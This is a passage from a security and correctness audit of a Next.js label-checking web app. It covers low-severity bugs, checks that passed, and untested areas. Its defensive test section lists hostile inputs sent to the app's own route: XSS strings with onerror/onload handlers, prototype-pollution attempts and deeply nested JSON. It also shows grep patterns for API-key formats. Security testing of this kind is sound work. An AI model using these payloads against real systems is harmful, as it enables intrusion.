  final statuses: [{"id":"f0.png","status":"done"},{"id":"f1.png","status":"done"},
                   {"id":"late0.png","status":"queued"},{"id":"late1.png","status":"queued"},
                   {"id":"late2.png","status":"queued"}]
  runSection now visible again? true  (the 3 late files are stuck at 'queued')
```

Recoverable — the button reappears offering "Check 3 labels" — so this is a
papercut, not data loss. Worth noting only because the button count changes under
the user mid-run while the run itself ignores the new files.

**Fix.** Either disable the file input while `running`, or make the worker read
from a ref holding the live queue rather than a captured array.

---

## 18. LOW — `npm run lint` fails while `npm run build` passes

**REPRODUCED.**

```
$ npm run lint ; echo "REAL LINT EXIT CODE: $?"
J:\claudey\ttb-label-check\src\components\SingleCheck.tsx
  64:7  error  Calling setState synchronously within an effect can trigger cascading renders
                                                          react-hooks/set-state-in-effect
J:\claudey\ttb-label-check\src\lib\reader\mock.ts
  61:14  warning  '_request' is defined but never used     @typescript-eslint/no-unused-vars
✖ 2 problems (1 error, 1 warning)
REAL LINT EXIT CODE: 1

$ npx tsc --noEmit ; echo "REAL TSC EXIT CODE: $?"
REAL TSC EXIT CODE: 0

$ npm run build
✓ Compiled successfully in 16.5s
  Finished TypeScript in 3.2s
✓ Generating static pages (7/7)
BUILD PIPE STATUS: 0

$ npx vitest run
 Test Files  7 passed (7)
      Tests  120 passed (120)
```

`next build` in Next 16 no longer runs ESLint, so a red lint is invisible to CI
that only builds. The flagged line is the `setPreviewUrl(null)` branch of the
object-URL effect (`SingleCheck.tsx:62-70`) — the effect's cleanup logic is
correct (see the fine section), it is the extra render that is objected to.

The `_request` warning is a false positive of style: the parameter is
deliberately unused in `MockReader.read`.

**Fix.** Rewrite the effect so the null branch is not a synchronous setState —
derive `previewUrl` with `useMemo` keyed on `image` and revoke in a cleanup — and
add `"^_"` to `argsIgnorePattern` in `eslint.config.mjs`. Add `npm run lint` to
the CI gate; a green build is currently not evidence of a green lint.

---

## 19. LOW — the `aria-live` region is mounted already populated, so it never announces

**INFERRED.** `src/components/ReportView.tsx:34-37`

```tsx
<section className={…} aria-live="polite">
```

`ReportView` is conditionally rendered (`SingleCheck.tsx:203`), so this element is
inserted into the DOM with its content already present. Screen readers announce
*changes* to a live region that was already being observed; a region that appears
already populated is generally not announced. The region is therefore inert.

It does no harm, and the focus move on line 128-133 is what actually informs the
user — so this is a redundant safety net that is not in fact a net, worth knowing
about rather than worth fixing urgently.

**Fix.** Render a permanent empty `<div aria-live="polite" className="sr-only" />`
in the page shell and write a short sentence into it when the report arrives
("Check complete. No problems found."), rather than marking the report body
itself as live.

---

## 20. LOW — `next dev` leaves untracked `AGENTS.md` / `CLAUDE.md` in the repo

**REPRODUCED.**

```
$ git status --short
 M .gitignore
?? AGENTS.md
?? CLAUDE.md
?? docs/AUDIT-CORRECTNESS.md
?? scripts/verify-fills.ts
?? tests/regulationSync.test.ts

$ git check-ignore -v AGENTS.md CLAUDE.md
(no output — NOT ignored)
```

Next 16's dev server writes these agent-instruction files on every `next dev`
(`node_modules/next/dist/server/lib/generate-agent-files.js`). They are not in
`.gitignore`, so they will show up as untracked in every clone and eventually be
committed by accident.

`scripts/verify-fills.ts` and `tests/regulationSync.test.ts` being untracked is
presumably in-flight work, not a defect.

**Fix.** Either commit them deliberately or add `AGENTS.md` and `CLAUDE.md` to
`.gitignore`.

---

## Things I tried that turned out to be fine

These were all specific suspicions I set out to confirm. Each is listed because
"I checked and it holds" is a result.

**The Anthropic SDK error class names are all real, and `translate()` reaches
every branch.** This was the highest-probability silent failure — a
`instanceof Anthropic.SomethingThatDoesNotExist` never fires and the friendly
message never appears. Checked against the installed package:

```
sdk version: 0.121.0
   APIError                 => function APIError
   APIConnectionError       => function APIConnectionError
   APIConnectionTimeoutError=> function APIConnectionTimeoutError
APIConnectionError instanceof APIError: true  status= undefined
Timeout instanceof APIConnectionError: true | instanceof APIError: true  status= undefined
```

`APIConnectionError` *is* a subclass of `APIError`, so I expected the first
`if (error instanceof Anthropic.APIError)` block at `anthropic.ts:128` to swallow
connection errors before line 164 could see them. It does not: connection errors
carry `status: undefined`, every inner branch tests a concrete status (including
the guarded `status !== undefined && status >= 500`), and the block has no
trailing `return`, so control falls through correctly to the timeout and
connection handlers. This ordering is subtle and correct.

**`clearTimeout` is always reached in `gemini.ts`.** It is in a `finally`
(`:198-200`) that wraps the fetch, the `!response.ok` throw, the JSON parse and
the `normalise` call. Every path — success, `ReaderError`, `AbortError`, unknown
throw — passes through it. No timer leak.

**No API key, stack trace or internal path reaches the client.** I read every
`catch` in the route and both readers. The route's generic handler
(`route.ts:132-140`) logs server-side with `console.error` and returns a fixed
string; the `ReaderError` handler returns only `options.userMessage`, never
`error.message` or `cause`. Gemini's `translateHttp` truncates the upstream body
to 200 characters and only into the *internal* message, which is never
serialised. The only client-visible internal string is the `JSON.parse` message
in finding 14. The Gemini key does travel in a URL query string
(`gemini.ts:113`), which is Google's documented scheme, but it never appears in a
response.

**No secrets are bundled into client JS.**

```
$ grep -rlE "GEMINI_API_KEY|ANTHROPIC_API_KEY|LABEL_READER" .next/static/
.next/static/chunks/0emwx4d8pibm0.js
$ grep -ohE ".{90}(GEMINI_API_KEY|ANTHROPIC_API_KEY).{90}" .next/static/chunks/0emwx4d8pibm0.js
 about the image you supplied. Set"," ",(0,r.jsx)("code",{…,children:"GEMINI_API_KEY"})," or"…
$ grep -rlE "AIzaSy[A-Za-z0-9_-]{20,}|sk-ant-[A-Za-z0-9_-]{20,}" .next/
(no output — no key values anywhere in the build)
$ grep -rohE "process\.env\.[A-Z_]+" .next/static/
(no output — no env access in client code)
$ grep -rlE "generativelanguage|api\.anthropic\.com" .next/static/
(no output)
```

The only hits are the two variable *names* rendered as visible UI copy in
`DemoModeWarning`, which is intentional and correct. `page.tsx` resolving
`hasRealReader()` on the server is the right call.

**`.gitignore` covers `.env.local`.** `git check-ignore -v .env.local` →
`.gitignore:34:.env*`. (Side effect: `.env.example` is also ignored, so a
committed template would need `-f`.)

**There is no server-side decompression bomb.** I went looking for one and there
is nothing to find: the route never decodes the image. It does
`Buffer.from(await file.arrayBuffer())` and base64-encodes it for the provider.
`sharp` is a devDependency used only by `scripts/make-samples.ts` and is not
imported by any runtime path. A 30000×30000 PNG would exhaust the *client's*
memory in `createImageBitmap` (`downscale.ts:69`) — the attacker's own browser —
and never touch the server.

**Malformed multipart, zero-byte and truncated uploads are all handled cleanly.**
Every one returned a correct 4xx with a plain-language message and no stack:

```
A1 raw text body, multipart content-type   -> 400 "The upload could not be read. Please try again."
A2 truncated multipart, no closing boundary-> 400 "The upload could not be read. Please try again."
A3 Content-Type: application/json          -> 400 "The upload could not be read. Please try again."
A4 empty body, no content-type             -> 400 "The upload could not be read. Please try again."
B1 zero-byte file                          -> 400 "The uploaded file is empty."
B7 no image part at all                    -> 400 "No label image was included with this request."
B8 image field is a string, not a File     -> 400 "No label image was included with this request."
```

The `file instanceof File` check on line 69 correctly rejects a string field —
a common miss.

**Deeply nested JSON does not blow the stack.** V8's `JSON.parse` is iterative;
200,000 levels of nesting parsed in 64 ms and was rejected on the beverage-type
check:

```
D1  nesting depth 100000                    -> 400 "Choose a beverage type: …"  (36ms)
D2b 200000-deep nested array                -> 400 "Choose a beverage type: …"  (64ms)
D2  valid app + 5000-deep array in an extra field -> 200 (29ms, extra field ignored)
```

**No prototype pollution.** `JSON.parse` creates `__proto__` as a plain own
property rather than invoking the setter, and `parseApplication` reads only known
keys onto a fresh object literal:

```
D3  __proto__ pollution attempt             -> 200, no effect
D4  constructor.prototype pollution         -> 200, no effect
D10 beverageType:"toString"                 -> 400 "Choose a beverage type: …"  (Set.has, not `in`)
```

`normaliseHeader` in `csv.ts:83` strips underscores, so a `__proto__` CSV column
becomes `proto` — safe, if accidentally so.

**User-supplied strings are reflected, but not dangerously.** `brandName` and
`file.type` come back verbatim in the JSON response:

```
D11 brandName = "</script><img src=x onerror=alert(1)>"
    -> 200, content-type: application/json, echoed into `expected` and `explanation`
D12 hostile MIME string
    -> 400, content-type: application/json,
       {"…message":"</script><svg onload=alert(1)> cannot be read. …"}
```

The response is always `application/json` (never rendered as a document) and
React escapes on render, so there is no XSS. The one place reflection genuinely
bites is the CSV export — finding 5.

**The `cursor` shared by the four batch workers has no race.** This was my main
suspicion in `run()`. `const index = cursor++` has no `await` between the read
and the increment, and JavaScript is single-threaded, so the increment is atomic
with respect to the event loop. My four-worker simulation processed all twelve
items exactly once (`statuses` progressed `q`→`w`→`d` with no duplicates and no
skips). Re-running is also safe: `pending` filters on `status === "queued"`, so
`done` and `failed` items are never reprocessed. The `cancelled` ref does stop
work, at the top of each loop iteration — which means up to four in-flight labels
still complete, exactly as the button's own text promises ("Stop after the labels
currently in progress").

**`ElapsedTimer`'s interval is always cleared.** The component is mounted only
while `status.phase === "working"` (`SingleCheck.tsx:193`), and the effect returns
`clearInterval` (`:227`). Any phase change unmounts it and runs the cleanup. I
found no path that leaves a timer running or sets state after unmount — the other
async writers (`submit`, `loadSample`) write through `setStatus` on a component
that outlives them, and React 19 does not warn on unmounted setState anyway.

**The object-URL lifecycle is correct.** `SingleCheck.tsx:62-70` revokes the
previous URL in the effect cleanup before creating the next, and revokes on
unmount. No leak. (ESLint objects to the `setPreviewUrl(null)` branch on style
grounds — finding 18 — not correctness.)

**The skip link works.** My first probe suggested it stayed clipped on focus; that
was a stale style read. Re-measured properly on a real focus:

```js
"skip": { "isActive": true, "matchesFocus": true, "matchesFocusVisible": true,
          "clipPath": "none", "rect": "188x43 @8" }
```

It becomes a 188×43 px box at the top-left. Correct.

**Every text colour pair passes WCAG AA.** Computed from the token values in
`globals.css`, not eyeballed — twenty pairs, all passing, several by a wide
margin:

```
### TEXT (WCAG AA 4.5:1)
PASS  18.15:1  body ink on surface            PASS  7.68:1  ink-soft on surface (17/15/13px)
PASS  16.76:1  body ink on canvas             PASS  7.09:1  ink-soft on canvas
PASS   8.57:1  brand on surface               PASS  6.84:1  ink-soft on muted-bg
PASS   8.57:1  white on brand (primary btn)   PASS  5.57:1  ink-soft on line (disabled btn)
PASS  10.97:1  white on brand-dark            PASS  4.53:1  pass on pass-bg
PASS   5.05:1  pass on surface                PASS  5.38:1  review on review-bg
PASS   5.93:1  review on surface              PASS  5.72:1  fail on fail-bg
PASS   6.54:1  fail on surface                PASS  5.33:1  muted on muted-bg
PASS   6.54:1  white on fail (Try again btn)
```

The tightest is `pass` on `pass-bg` at 4.53:1 — it clears, but with 0.03 of
headroom, so any future darkening of that background breaks it. The verdict
palette also carries a glyph and a word alongside every colour
(`verdict.tsx:25-61`), which is the right call and correctly implemented.

**The 5-second budget is met by the rules layer.** `verify()` on a normal
extraction is ~1 ms as claimed; all the measured latency in finding 1 comes from
the unbounded input, not from the engine.

**The test suite is green.** 120 tests across 7 files, 524 ms.

---

## What I could not test

- **Live React behaviour in a browser.** The available Chrome could not hydrate
  the client bundle (its request layer 403'd the `SingleCheck` chunk on every
  load; `REACT_IS_HYDRATED: false`). Findings 9 and 17 come from a verbatim
  re-implementation of `run()` and its render gates, and findings 13 and 19 from
  code. They should be confirmed by clicking through before being treated as
  closed. Static DOM, CSS, focus order and accessible names *were* measured
  directly and are marked REPRODUCED.
- **A real provider.** No `GEMINI_API_KEY` or `ANTHROPIC_API_KEY` is present on
  this machine, so all HTTP attacks ran against the `MockReader`. Finding 3 was
  reproduced by driving the real `GeminiReader` with an intercepted `fetch`,
  which exercises its actual parse and `normalise` code; what it cannot tell you
  is how often Gemini emits those shapes in practice.
- **The deployment platform's request-body limit** (finding 8), which determines
  whether the 8 MB message is reachable in production.
- **Screen-reader output.** Findings 10, 11, 13 and 19 are based on the DOM, the
  browser's own `input.labels` associations, and the ARIA specifications — not on
  listening to NVDA or VoiceOver. Given the stated audience, one pass with a real
  screen reader would be worth more than the rest of this section.
